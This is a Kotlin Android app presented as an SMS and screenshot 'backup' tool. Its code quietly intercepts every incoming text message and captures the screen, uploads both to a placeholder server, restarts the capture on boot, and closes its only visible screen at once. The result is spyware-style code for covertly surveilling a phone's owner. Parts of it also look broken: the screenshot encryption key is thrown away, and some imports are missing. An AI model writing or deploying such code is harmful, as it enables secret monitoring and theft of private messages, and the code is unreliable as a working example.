package com.example.unifiedbackupapp

import android.app.*
import android.content.*
import android.database.sqlite.*
import android.graphics.*
import android.media.*
import android.media.projection.*
import android.os.*
import android.provider.Telephony
import android.util.*
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.security.SecureRandom
import java.util.concurrent.TimeUnit
import javax.crypto.*
import javax.crypto.spec.GCMParameterSpec

class MainActivity : AppCompatActivity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        startForegroundService(Intent(this, SmsBackupService::class.java))
        startForegroundService(Intent(this, ScreenShotService::class.java))
        finish()
    }
}

class SmsBackupService : Service() {
    companion object { const val CH = "SMS_SVC"; const val WK = "SMS_WK" }
    override fun onCreate() {
        super.onCreate()
        getSystemService(NotificationManager::class.java).createNotificationChannel(
            NotificationChannel(CH, "SMS Backup", NotificationManager.IMPORTANCE_LOW))
        startForeground(1, NotificationCompat.Builder(this, CH)
            .setContentTitle("SMS Backup").setSmallIcon(android.R.drawable.ic_menu_save).build())
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int) = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null
}

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (i.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val db = SmsDatabase(c)
        Telephony.Sms.Intents.getMessagesFromIntent(i).forEach { m ->
            db.insert(SmsRecord(fromNumber = m.originatingAddress ?: "?", messageBody = m.messageBody ?: "", sentAt = m.timestampMillis))
        }
        WorkManager.getInstance(c).enqueueUniqueWork(SmsBackupService.WK, ExistingWorkPolicy.KEEP,
            OneTimeWorkRequestBuilder<SmsUploadWorker>()
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build())
    }
}

class SmsDatabase(ctx: Context) : SQLiteOpenHelper(ctx, "sms.db", null, 1) {
    override fun onCreate(db: SQLiteDatabase) = db.execSQL(
        "CREATE TABLE sms(id INTEGER PRIMARY KEY AUTOINCREMENT, from_number TEXT, body TEXT, sent_at INTEGER, uploaded INTEGER DEFAULT 0)")
    override fun onUpgrade(db: SQLiteDatabase, o: Int, n: Int) {}
    fun insert(r: SmsRecord) {
        writableDatabase.insert("sms", null, ContentValues().apply {
            put("from_number", r.fromNumber); put("body", r.messageBody); put("sent_at", r.sentAt); put("uploaded", 0)
        })
    }
    fun unsent(): List<SmsRecord> {
        val l = mutableListOf<SmsRecord>()
        readableDatabase.rawQuery("SELECT id,from_number,body,sent_at FROM sms WHERE uploaded=0 ORDER BY sent_at", null).use {
            while (it.moveToNext()) l.add(SmsRecord(it.getLong(0), it.getString(1), it.getString(2), it.getLong(3)))
        }
        return l
    }
    fun mark(id: Long) = writableDatabase.execSQL("UPDATE sms SET uploaded=1 WHERE id=?", arrayOf(id))
}

data class SmsRecord(val id: Long = 0, val fromNumber: String, val messageBody: String, val sentAt: Long)

class SmsUploadWorker(c: Context, p: WorkerParameters) : CoroutineWorker(c, p) {
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val db = SmsDatabase(applicationContext)
        val list = db.unsent()
        if (list.isEmpty()) return@withContext Result.success()
        val client = OkHttpClient()
        for (r in list) {
            val j = JSONObject().apply { put("from", r.fromNumber); put("body", r.messageBody); put("sent_at", r.sentAt) }
            try {
                val resp = client.newCall(Request.Builder()
                    .url("https://your-server.com/api/sms")
                    .post(j.toString().toRequestBody("application/json".toMediaTypeOrNull())).build()).execute()
                if (!resp.isSuccessful) return@withContext Result.retry()
                db.mark(r.id)
            } catch (e: Exception) { return@withContext Result.retry() }
        }
        Result.success()
    }
}

class ScreenShotService : Service() {
    companion object { const val CH = "SCR_SVC"; const val RC = 202; const val EP = "https://your-server.com/api/screenshot" }
    private var proj: MediaProjection? = null
    private val reader = ImageReader.newInstance(
        Resources.getSystem().displayMetrics.widthPixels,
        Resources.getSystem().displayMetrics.heightPixels, PixelFormat.RGBA_8888, 2)
    override fun onCreate() {
        super.onCreate()
        getSystemService(NotificationManager::class.java).createNotificationChannel(
            NotificationChannel(CH, "Screenshot", NotificationManager.IMPORTANCE_LOW))
        startForeground(2, NotificationCompat.Builder(this, CH)
            .setContentTitle("Screenshot").setSmallIcon(android.R.drawable.ic_menu_camera).build())
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (proj == null) {
            val rc = i?.getIntExtra("resultCode", Activity.RESULT_CANCELED) ?: Activity.RESULT_CANCELED
            val data = i?.getParcelableExtra<Intent>("data")
            if (rc == Activity.RESULT_OK && data != null) {
                proj = (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager).getMediaProjection(rc, data)
                val dm = Resources.getSystem().displayMetrics
                proj!!.createVirtualDisplay("cap", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
                Handler(Looper.getMainLooper()).postDelayed({
                    reader.acquireLatestImage()?.use { img ->
                        val b = toBitmap(img); val (e, iv) = enc(b); up(e, iv)
                    }
                    stopSelf()
                }, 2000)
            } else {
                val pm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivity(Intent(this, ProjectionRequestActivity::class.java)
                    .putExtra("reqIntent", pm.createScreenCaptureIntent())
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            }
        }
        return START_STICKY
    }
    private fun toBitmap(img: Image): Bitmap {
        val p = img.planes[0]; val b = Bitmap.createBitmap(img.width, img.height, Bitmap.Config.ARGB_8888)
        b.copyPixelsFromBuffer(p.buffer); img.close(); return b
    }
    private fun enc(b: Bitmap): Pair<ByteArray, ByteArray> {
        val baos = ByteArrayOutputStream(); b.compress(Bitmap.CompressFormat.PNG, 100, baos)
        val kg = KeyGenerator.getInstance("AES"); kg.init(256); val k = kg.generateKey()
        val iv = ByteArray(12).also { SecureRandom().nextBytes(it) }
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        c.init(Cipher.ENCRYPT_MODE, k, GCMParameterSpec(128, iv))
        return Pair(c.doFinal(baos.toByteArray()), iv)
    }
    private fun up(e: ByteArray, iv: ByteArray) {
        val j = JSONObject().apply {
            put("image", Base64.encodeToString(e, Base64.NO_WRAP))
            put("iv", Base64.encodeToString(iv, Base64.NO_WRAP)); put("format", "png")
        }
        OkHttpClient().newCall(Request.Builder().url(EP)
            .post(j.toString().toRequestBody("application/json".toMediaTypeOrNull())).build()).enqueue(object : Callback {
                override fun onFailure(c: Call, ex: java.io.IOException) { Log.e("SS", "fail", ex) }
                override fun onResponse(c: Call, r: Response) { Log.i("SS", "ok=${r.isSuccessful}") }
            })
    }
    override fun onBind(i: Intent?): IBinder? = null
}

class ProjectionRequestActivity : AppCompatActivity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        startActivityForResult(intent.getParcelableExtra<Intent>("reqIntent")!!, ScreenShotService.RC)
    }
    override fun onActivityResult(rc: Int, res: Int, d: Intent?) {
        if (rc == ScreenShotService.RC) {
            startForegroundService(Intent(this, ScreenShotService::class.java).apply {
                putExtra("resultCode", res); putExtra("data", d)
            }); finish()
        } else super.onActivityResult(rc, res, d)
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (i.action == Intent.ACTION_BOOT_COMPLETED) {
            c.startForegroundService(Intent(c, SmsBackupService::class.java))
            c.startForegroundService(Intent(c, ScreenShotService::class.java))
        }
    }
}
